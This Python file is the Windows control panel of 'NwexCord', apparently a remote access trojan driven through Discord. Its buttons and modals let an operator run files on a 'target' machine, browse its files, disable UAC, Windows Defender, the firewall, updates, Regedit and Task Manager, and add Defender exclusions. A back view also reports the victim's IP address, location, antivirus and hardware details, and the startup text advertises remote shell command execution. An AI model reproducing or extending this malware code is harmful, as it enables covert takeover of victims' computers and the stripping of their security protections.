import discord
from core.info import get_sys_info
import asyncio
import hashlib
import os
from datetime import datetime
from Tools.Windows.manager import WindowsManager
from Tools.Windows.filemanager import build_file_manager_embed, FileManagerView


def _get_startup_view():
    from core.views import StartupView
    return StartupView


def embed_windows_panel():
    """Create the Windows panel embed."""
    embed = discord.Embed(
        title="🪟 NwexCord Windows",
        description=(
            "Select a Windows tool from the buttons below.\n\n"
            "▶️ **Run File** — Run a file on the target\n"
            "📂 **File Manager** — Browse files on the target\n"
            "🛡️ **UAC Bypass** — Enable/Disable UAC\n"
            "🔒 **WDDisable** — Enable/Disable Windows Defender\n"
            "📁 **WDExclusion** — Add Defender exclusion path\n"
            "⚡ **ElevatedPrivileges** — Run program as admin\n"
            "🔄 **Windows Update** — Enable/Disable Updates\n"
            "🔑 **Regedit** — Enable/Disable Registry Editor\n"
            "🧱 **Firewall** — Enable/Disable Firewall\n"
            "📊 **Task Manager** — Enable/Disable Task Manager"
        ),
        color=discord.Color.from_rgb(0, 120, 215)
    )
    embed.set_footer(text="NwexCord • Windows Panel")
    return embed


class RunFileModal(discord.ui.Modal, title="▶️ Run File"):
    file_path = discord.ui.TextInput(
        label="File Path",
        placeholder="C:\\path\\to\\file.exe",
        style=discord.TextStyle.short,
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer()
        loop = asyncio.get_event_loop()
        success, msg = await loop.run_in_executor(None, WindowsManager.run_file, str(self.file_path))
        status = "✅" if success else "❌"
        color = discord.Color.green() if success else discord.Color.red()
        embed = discord.Embed(title=f"{status} Run File", description=msg, color=color)
        embed.set_footer(text="NwexCord • Windows")
        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())


class ElevatedPrivilegesModal(discord.ui.Modal, title="⚡ Elevated Privileges"):
    file_path = discord.ui.TextInput(
        label="File Path (to run as administrator)",
        placeholder="C:\\path\\to\\program.exe",
        style=discord.TextStyle.short,
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer()
        loop = asyncio.get_event_loop()
        success, msg = await loop.run_in_executor(None, WindowsManager.run_elevated, str(self.file_path))
        status = "✅" if success else "❌"
        color = discord.Color.green() if success else discord.Color.red()
        embed = discord.Embed(title=f"{status} Elevated Privileges", description=msg, color=color)
        embed.set_footer(text="NwexCord • Windows")
        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())


class WDExclusionModal(discord.ui.Modal, title="📁 WD Exclusion"):
    exc_path = discord.ui.TextInput(
        label="Path to Exclude",
        placeholder="C:\\path\\to\\exclude",
        style=discord.TextStyle.short,
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer()
        loop = asyncio.get_event_loop()
        success, msg = await loop.run_in_executor(None, WindowsManager.wd_exclusion, str(self.exc_path))
        status = "✅" if success else "❌"
        color = discord.Color.green() if success else discord.Color.red()
        embed = discord.Embed(title=f"{status} WD Exclusion", description=msg, color=color)
        embed.set_footer(text="NwexCord • Windows")
        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())


class WindowsResultView(discord.ui.View):
    """View shown after a Windows tool executes, with Back button."""
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="Back to Windows", emoji="⬅", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_windows_panel(), attachments=[], view=WindowsPanelView())


class WindowsPanelView(discord.ui.View):
    """The panel with all Windows tool buttons."""
    def __init__(self):
        super().__init__(timeout=300)

    # Row 0
    @discord.ui.button(label="Run File", emoji="▶️", style=discord.ButtonStyle.secondary, row=0)
    async def run_file_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(RunFileModal())

    @discord.ui.button(label="File Manager", emoji="📂", style=discord.ButtonStyle.secondary, row=0)
    async def file_manager_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        embed, items, fc, fic = build_file_manager_embed("C:\\", session_id)
        view = FileManagerView(session_id, "C:\\", items)
        await interaction.edit_original_response(content=None, embed=embed, view=view)

    @discord.ui.button(label="UAC Bypass", emoji="🛡️", style=discord.ButtonStyle.secondary, row=0)
    async def uac_bypass_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        is_enabled = WindowsManager.get_uac_status()
        # Toggle: if enabled -> disable, if disabled -> enable
        loop = asyncio.get_event_loop()
        success, msg = await loop.run_in_executor(None, WindowsManager.uac_bypass, not is_enabled)
        new_state = not is_enabled
        status_icon = "🟢 Enabled" if new_state else "🔴 Disabled"
        status = "✅" if success else "❌"
        color = discord.Color.green() if success else discord.Color.red()
        embed = discord.Embed(
            title=f"{status} UAC Bypass",
            description=f"{msg}\n\n**Current UAC Status:** {status_icon}",
            color=color
        )
        embed.set_footer(text="NwexCord • Windows")
        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())

    @discord.ui.button(label="WDDisable", emoji="🔒", style=discord.ButtonStyle.secondary, row=0)
    async def wd_disable_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        is_enabled = WindowsManager.get_wd_status()
        loop = asyncio.get_event_loop()
        success, msg = await loop.run_in_executor(None, WindowsManager.wd_toggle, not is_enabled)
        new_state = not is_enabled
        status_icon = "🟢 Enabled" if new_state else "🔴 Disabled"
        status = "✅" if success else "❌"
        color = discord.Color.green() if success else discord.Color.red()
        embed = discord.Embed(
            title=f"{status} WDDisable",
            description=f"{msg}\n\n**Current Status:** {status_icon}",
            color=color
        )
        embed.set_footer(text="NwexCord • Windows")
        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())

    @discord.ui.button(label="WDExclusion", emoji="📁", style=discord.ButtonStyle.secondary, row=0)
    async def wd_exclusion_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(WDExclusionModal())

    # Row 1
    @discord.ui.button(label="ElevatedPrivileges", emoji="⚡", style=discord.ButtonStyle.secondary, row=1)
    async def elevated_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(ElevatedPrivilegesModal())

    @discord.ui.button(label="Windows Update", emoji="🔄", style=discord.ButtonStyle.secondary, row=1)
    async def winupdate_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        is_running = WindowsManager.get_winupdate_status()
        loop = asyncio.get_event_loop()
        success, msg = await loop.run_in_executor(None, WindowsManager.windows_update, not is_running)
        new_state = not is_running
        status_icon = "🟢 Enabled" if new_state else "🔴 Disabled"
        status = "✅" if success else "❌"
        color = discord.Color.green() if success else discord.Color.red()
        embed = discord.Embed(
            title=f"{status} Windows Update",
            description=f"{msg}\n\n**Current Status:** {status_icon}",
            color=color
        )
        embed.set_footer(text="NwexCord • Windows")
        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())

    @discord.ui.button(label="Regedit", emoji="🔑", style=discord.ButtonStyle.secondary, row=1)
    async def regedit_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        is_enabled = WindowsManager.get_regedit_status()
        loop = asyncio.get_event_loop()
        success, msg = await loop.run_in_executor(None, WindowsManager.regedit_toggle, not is_enabled)
        new_state = not is_enabled
        status_icon = "🟢 Enabled" if new_state else "🔴 Disabled"
        status = "✅" if success else "❌"
        color = discord.Color.green() if success else discord.Color.red()
        embed = discord.Embed(
            title=f"{status} Regedit",
            description=f"{msg}\n\n**Current Status:** {status_icon}",
            color=color
        )
        embed.set_footer(text="NwexCord • Windows")
        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())

    @discord.ui.button(label="Firewall", emoji="🧱", style=discord.ButtonStyle.secondary, row=1)
    async def firewall_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        is_enabled = WindowsManager.get_firewall_status()
        loop = asyncio.get_event_loop()
        success, msg = await loop.run_in_executor(None, WindowsManager.firewall_toggle, not is_enabled)
        new_state = not is_enabled
        status_icon = "🟢 Enabled" if new_state else "🔴 Disabled"
        status = "✅" if success else "❌"
        color = discord.Color.green() if success else discord.Color.red()
        embed = discord.Embed(
            title=f"{status} Firewall",
            description=f"{msg}\n\n**Current Status:** {status_icon}",
            color=color
        )
        embed.set_footer(text="NwexCord • Windows")
        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())

    @discord.ui.button(label="Task Manager", emoji="📊", style=discord.ButtonStyle.secondary, row=1)
    async def taskmgr_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        is_enabled = WindowsManager.get_taskmgr_status()
        loop = asyncio.get_event_loop()
        success, msg = await loop.run_in_executor(None, WindowsManager.taskmgr_toggle, not is_enabled)
        new_state = not is_enabled
        status_icon = "🟢 Enabled" if new_state else "🔴 Disabled"
        status = "✅" if success else "❌"
        color = discord.Color.green() if success else discord.Color.red()
        embed = discord.Embed(
            title=f"{status} Task Manager",
            description=f"{msg}\n\n**Current Status:** {status_icon}",
            color=color
        )
        embed.set_footer(text="NwexCord • Windows")
        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())

    # Row 2: Back
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Return to the startup info message."""
        await interaction.response.defer()
        info = get_sys_info()
        left_col = (
            f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
            f"👤 **UserName** : {info['UserName']}\n"
            f"🖥️ **PCName** : {info['PCName']}\n"
            f"🪟 **OS** : {info['OS']}\n"
            f"📁 **Client** : {info['Client']}\n"
            f"⚙️ **Process** : {info['Process']}\n"
            f"📅 **DateTime** : {info['DateTime']}\n"
            f"🎇 **GPU** : {info['GPU']}\n"
            f"🧠 **CPU** : {info['CPU']}\n"
            f"🏷️ **Identifier** : {info['Identifier']}\n"
            f"📊 **Ram** : {info['Ram']}"
        )
        right_col = (
            f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
            f"⏱️ **LastReboot** : {info['LastReboot']}\n"
            f"🛡️ **Antivirus** : {info['Antivirus']}\n"
            f"⚠️ **Firewall** : {info['Firewall']}\n"
            f"🌐 **MacAddress** : {info['MacAddress']}\n"
            f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
            f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
            f"💻 **Platform** : {info['Platform']}\n"
            f"📋 **Ver** : {info['Ver']}\n"
            f"🔵 **.Net** : {info['.Net']}\n"
            f"🔋 **Battery** : {info['Battery']}"
        )
        embed = discord.Embed(title="[ Information ]", color=discord.Color.dark_theme())
        embed.add_field(name="\u200b", value=left_col, inline=True)
        embed.add_field(name="\u200b", value=right_col, inline=True)
        embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
        msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
        await interaction.edit_original_response(content=msg_content, embed=embed, view=_get_startup_view()())


